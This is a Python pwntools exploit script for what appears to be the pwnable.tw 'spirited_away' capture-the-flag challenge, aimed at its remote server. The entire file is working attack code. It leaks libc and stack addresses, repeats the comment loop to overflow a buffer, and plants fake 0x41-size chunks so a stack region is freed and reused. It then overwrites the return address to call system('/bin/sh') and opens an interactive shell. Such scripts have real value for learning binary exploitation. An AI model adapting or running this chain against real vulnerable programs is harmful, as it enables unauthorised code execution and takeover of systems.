from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./spirited_away')
	bin = ELF('./spirited_away')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10204)
	bin = ELF('./spirited_away')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recvuntil('Please enter your name: ')
cn.send('veritas')
cn.recvuntil('Please enter your age: ')
#z('b*0x080486F8\nc')
cn.sendline(str(0x62626262))
cn.recvuntil('Why did you came to see this movie? ')
cn.send('X'*0x18)
cn.recvuntil('Please enter your comment: ')
cn.send('a'*60)

cn.recvuntil('X'*0x18)
libc.address = u32(cn.recv(4))-libc.sym['_IO_file_sync']-7
success('libc: '+hex(libc.address))
cn.recvuntil('Would you like to leave another comment? <y/n>:')
cn.send('y')


#z('b*0x080486F8\nc')
cn.recvuntil('Please enter your name: ')
cn.send('veritas')
cn.recvuntil('Please enter your age: ')
cn.sendline(str(0x62626262))

cn.recvuntil('Why did you came to see this movie? ')
cn.send('X'*0x38)
cn.recvuntil('Please enter your comment: ')
cn.send('a'*60)


cn.recvuntil('X'*0x38)
stack  = u32(cn.recv(4))-(0xf0-0x80)
success('stack: '+hex(stack))
cn.recvuntil('Would you like to leave another comment? <y/n>:')
cn.send('y')


for i in range(100):
	cn.recvuntil('Please enter your name: ')
	cn.send('a'*60)
	cn.recvuntil('Please enter your age: ')
	cn.sendline(str(0x62626262))
	cn.recvuntil('Why did you came to see this movie? ')
	cn.send('a'*80)
	cn.recvuntil('Please enter your comment: ')
	cn.send('a'*60)
	cn.recvuntil('Would you like to leave another comment? <y/n>:')
	cn.send('y')


cn.recvuntil('Please enter your name: ')
cn.send('a'*60)
cn.recvuntil('Why did you came to see this movie? ')
pay = p32(0) + p32(0x41) + 'a'*56 + p32(0) + p32(0x41)
cn.send(pay)
cn.recvuntil('Please enter your comment: ')
pay = 'a'*80 + 'bbbb' + p32(stack+8) + p32(0) + p32(0x41)
cn.send(pay)
cn.recvuntil('Would you like to leave another comment? <y/n>:')
success('libc: '+hex(libc.address))
success('stack: '+hex(stack))
#z('b*0x08048643\nc')

cn.send('y')

pay = 'a'*0x48 
pay+='bbbb' +p32(libc.sym['system']) + 'bbbb'+p32(libc.search('/bin/sh\x00').next())
cn.recvuntil('Please enter your name: ')
cn.send(pay)
cn.recv()
cn.sendline('aaa')
cn.recv()
cn.sendline('aaa')
cn.recv()
cn.sendline('n')


cn.interactive()
